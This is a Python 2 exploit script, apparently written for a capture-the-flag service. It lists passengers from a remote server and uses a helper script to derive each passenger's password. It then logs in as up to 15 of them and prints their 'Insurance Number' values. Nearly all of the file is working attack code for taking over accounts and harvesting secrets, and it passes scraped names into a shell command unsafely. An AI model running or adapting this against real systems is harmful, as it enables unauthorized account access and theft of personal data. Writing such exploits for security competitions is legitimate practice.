#!/usr/bin/python
# Echo client program
import socket
import sys
import time
import re
import subprocess

HOST = sys.argv[1]    # The remote host
PORT = 13132           # The same port as used by the server
s = None
for res in socket.getaddrinfo(HOST, PORT, socket.AF_UNSPEC, socket.SOCK_STREAM):
    af, socktype, proto, canonname, sa = res
    try:
	s = socket.socket(af, socktype, proto)
    except socket.error, msg:
	s = None
	continue
    try:
	s.connect(sa)
    except socket.error, msg:
	s.close()
	s = None
	continue
    break
if s is None:
    print 'could not open socket'
    sys.exit(1)

def read_until(s, sign='>'):
    data = ''
    while True:
        chunk = s.recv(42)
        
        if not chunk:
            break

        data += chunk

        if not chunk or sign in data:
            break

    return data

s.settimeout(23)
recv_hello = read_until(s, '+> ')

s.send("show passengers\n")

recv_passengers = read_until(s, '|=== Main Menu')

names = re.findall("- ([a-zA-Z]{2,}\s[A-Za-z]{2,})", recv_passengers, re.MULTILINE)

limit = min(len(names), 15)
for name in names[:limit]:

    proc = subprocess.Popen(["./exploit_helper.sh '%s'" % (name)], stdout=subprocess.PIPE, shell=True)
    (out, err) = proc.communicate()
    out = out.strip()

    s.send("login\n")
    recv_afterlogin = read_until(s, 'name)> ')

    s.send(name+"\n")
    recv_aftername = read_until(s, 'Password)> ')

    s.send(out+"\n")
    recv_afterlogin = read_until(s, '+> ')

    if 'Welcome back' not in recv_afterlogin:
        continue

    s.send("view profile\n")
    recv_afterprofile = read_until(s, '+> ')

    m = re.search("Insurance Number: ([a-z0-9]{16})", recv_afterprofile, re.MULTILINE)
    if m:
        print m.group(1)

    s.send("logout\n")
    recv_afterlogout = read_until(s, '+> ')


s.close()
